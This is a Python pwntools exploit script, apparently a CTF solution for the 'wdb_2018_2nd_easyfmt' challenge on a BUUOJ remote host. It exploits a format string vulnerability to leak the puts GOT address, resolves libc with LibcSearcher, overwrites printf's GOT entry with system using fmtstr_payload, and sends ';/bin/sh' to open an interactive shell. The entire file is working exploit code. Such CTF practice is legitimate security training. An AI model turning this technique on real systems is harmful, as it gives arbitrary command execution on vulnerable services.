from pwn import *

context(log_level='debug')

#io=process("./wdb_2018_2nd_easyfmt")
io=remote("node3.buuoj.cn",29336)
elf=ELF("./wdb_2018_2nd_easyfmt")



io.recv()
printf_got=elf.got['printf']
puts_got=elf.got['puts']
#payload=b'a'+p32(printf_got)+b'%8$s'

#偏移是6

payload=b'%7$s'+p32(puts_got)
io.send(payload)
#io.recvuntil(':')

puts=u32(io.recv(4))
success('printf addr: '+hex(puts))
io.recv()
'''
io.recv()
payload=b'a'+p32(printf_got)+b'%8$s'

io.send(payload)

io.recvuntil(b'\x08')

printf=u32(io.recv(4))

print("printf is ",hex(printf))
io.recv()
'''
from LibcSearcher import *  

libc = LibcSearcher('puts',puts)  
#获取libc加载地址  
libc_base = puts - libc.dump('puts')  
#获取system地址  
system_addr = libc_base + libc.dump('system')  
#获取/bin/sh地址  
#binsh_addr = libc_base + libc.dump('str_bin_sh')  


payload=fmtstr_payload(6,{printf_got:system_addr})

io.send(payload)

sleep(0.1)
io.recv()
io.sendline(b';/bin/sh\x00')

io.interactive()